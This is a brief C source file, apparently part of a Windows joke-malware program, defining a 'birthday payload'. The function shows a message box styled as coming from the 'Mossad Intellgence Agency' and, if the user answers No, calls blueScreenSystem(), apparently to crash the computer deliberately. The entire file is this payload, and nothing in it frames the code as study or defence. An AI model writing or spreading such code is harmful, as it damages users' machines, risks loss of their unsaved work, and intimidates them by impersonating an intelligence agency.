#include "headers/birthdaypyld.h"



void birthdayPayload(){
    if(MessageBoxW(NULL, L"Its My Birthday, Did you buy me a gift?", L"Mossad Intellgence Agency", MB_YESNO | MB_ICONQUESTION) == IDNO){
        blueScreenSystem();
    }
}